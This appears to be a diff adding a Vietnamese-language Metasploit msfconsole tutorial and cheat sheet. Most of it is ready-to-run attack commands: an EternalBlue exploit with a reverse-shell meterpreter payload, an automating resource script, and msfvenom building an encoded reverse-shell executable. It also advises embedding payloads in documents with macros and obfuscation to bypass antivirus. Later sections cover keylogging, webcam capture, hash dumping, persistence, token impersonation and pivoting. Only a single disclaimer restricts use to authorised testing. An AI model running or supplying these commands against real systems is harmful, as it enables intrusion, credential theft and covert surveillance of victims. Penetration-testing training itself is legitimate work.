@@ -1,0 +1,210 @@
+msfconsole là Metasploit Console — giao diện dòng lệnh chính của bộ công cụ Metasploit Framework, dùng để kiểm tra bảo mật, khai thác lỗ hổng và kiểm tra xâm nhập (penetration testing). Metasploit là một trong những framework nổi tiếng nhất dành cho pentester và hacker mũ trắng để mô phỏng các cuộc tấn công thực tế lên hệ thống, phát hiện lỗ hổng bảo mật, thử nghiệm khai thác và phát triển payload.
+Các điểm nổi bật về msfconsole:
+
+    Giao diện dòng lệnh mạnh mẽ: Cho phép bạn tìm kiếm, cấu hình, chạy exploit, tải payload và quản lý sessions.
+
+    Tích hợp nhiều module: Gồm exploit, auxiliary, post, payload, encoder, nops, evasion, v.v.
+
+    Tìm kiếm và sử dụng exploit: Có thể tìm nhanh các lỗ hổng, module liên quan, ví dụ search smb.
+
+    Chạy exploit và payload: Thiết lập các tham số, ví dụ set RHOST, set LHOST, rồi run để khai thác.
+
+    Quản lý session: Khi thành công, bạn có thể điều khiển shell, thực hiện post-exploitation...
+
+    Script hóa & tự động hóa: Hỗ trợ viết tài liệu tự động, dùng resource script .rc để tự động hóa các chuỗi lệnh.
+
+    Tích hợp các tool scan, brute-force, pivoting...
+
+Hướng dẫn cơ bản sử dụng msfconsole:
+1. Khởi động
+
+msfconsole
+
+2. Tìm kiếm module
+
+search <tên lỗ hổng hoặc dịch vụ>
+# Ví dụ: search samba
+
+3. Chọn module
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+4. Xem và thiết lập tham số
+
+show options
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.100
+
+5. Chọn payload
+
+show payloads
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+6. Khai thác
+
+run
+# hoặc exploit
+
+7. Quản lý sessions
+
+sessions
+sessions -i 1
+
+Một số lệnh hay dùng:
+
+    help hoặc ?: Xem danh sách lệnh hỗ trợ.
+
+    info <module>: Xem chi tiết về module.
+
+    back: Quay lại menu trước.
+
+    exit: Thoát khỏi msfconsole.
+
+    setg/unsetg: Thiết lập biến toàn cục cho toàn phiên.
+
+    jobs: Quản lý các job đang chạy (background).
+
+    db_nmap: Scan mạng và import kết quả vào database Metasploit.
+
+    use: Chọn module để dùng.
+
+Lưu ý:
+
+    Chạy msfconsole thường phải có quyền root (sudo msfconsole) để một số module hoạt động tối đa.
+
+    Không dùng vào mục đích tấn công trái phép — chỉ sử dụng với hệ thống bạn được phép kiểm thử!
+
+
+
+
+======================================================
+
+
+
+msfconsole nâng cao
+
+
+1. Automation với Resource Script (.rc)
+
+    Resource script giúp tự động hóa một loạt lệnh msfconsole.
+
+    Tạo file: nano script.rc
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.105
+set LHOST 192.168.1.100
+run
+
+Chạy script trong msfconsole:
+
+    msfconsole -r script.rc
+
+2. Sử dụng Database & Workspace
+
+    Lưu kết quả quét, quản lý nhiều dự án, tìm kiếm nhanh hơn.
+
+Khởi tạo DB:
+
+msfdb init
+
+Tạo workspace mới:
+
+workspace -a mypentest
+workspace mypentest
+
+Quét mạng tích hợp nmap:
+
+db_nmap -sV 192.168.1.0/24
+hosts
+services
+
+Tìm host có dịch vụ:
+
+services -p 445
+
+3. Pivoting (Tấn công xuyên mạng)
+
+    Khi đã có meterpreter trên 1 máy, bạn có thể pivot tấn công các máy khác trong mạng nội bộ.
+
+Tạo route:
+
+route add 10.10.10.0 255.255.255.0 1
+
+    Sử dụng các auxiliary scanner qua pivot:
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.10.10.0/24
+run
+
+    Có thể dùng SOCKS proxy để redirect lưu lượng (auxiliary/server/socks_proxy).
+
+4. Tùy biến Payload (Msfvenom nâng cao)
+
+    Thay đổi encoder, platform, custom shellcode, nhúng payload vào file hợp lệ.
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe
+
+    Nhúng vào file Word, PDF, script...
+
+    Kết hợp với macro, obfuscation để bypass AV.
+
+5. Post-Exploitation (Khai thác sau khi có shell)
+
+    Dump hash, keylogger, chụp màn hình, webcam...
+
+hashdump
+screenshot
+webcam_list
+webcam_snap
+keyscan_start
+
+Persistence: Giữ quyền truy cập sau reboot.
+
+run persistence -U -i 5 -p 4444 -r <IP>
+
+Privilege Escalation:
+
+    getsystem
+    load incognito
+    list_tokens -u
+    impersonate_token "NT AUTHORITY\SYSTEM"
+
+6. Tùy chỉnh nâng cao và mở rộng
+
+    Tự viết module mới (Ruby) trong thư mục:
+
+        /usr/share/metasploit-framework/modules/
+
+    Kết hợp với các công cụ khác: Cobalt Strike, Empire, Bloodhound, CrackMapExec...
+
+7. Một số lệnh nâng cao hữu ích
+Lệnh	Ý nghĩa
+jobs	Quản lý các job nền
+sessions -u <id>	Nâng quyền user session
+sessions -k <id>	Kết thúc session
+setg	Thiết lập biến toàn cục
+resource	Chạy file script .rc
+load	Nạp module Meterpreter tùy chọn
+8. Tips nâng cao khác
+
+    Auto-Exploit nhiều mục tiêu: Sử dụng RHOSTS với dải IP hoặc file list.
+
+    Module tùy chỉnh: Có thể tự tạo exploit/phishing module riêng (cần biết Ruby).
+
+    Kết hợp msfconsole + script bash/python để tự động hoá kiểm thử quy mô lớn.
+
+9. Ví dụ Pivoting nâng cao
+
+    Khai thác A thành công, dùng Meterpreter route traffic tới subnet nội bộ B.
+
+    Sử dụng module scan từ trong Meterpreter để phát hiện các mục tiêu nội bộ.
+
+    Tiếp tục exploit, thiết lập pivot chain nhiều lớp.
+
+10. Tài liệu & link tham khảo
+
+    Metasploit Unleashed (OffSec)
+
+    Metasploit Cheat Sheet
+
+    Wiki Metasploit
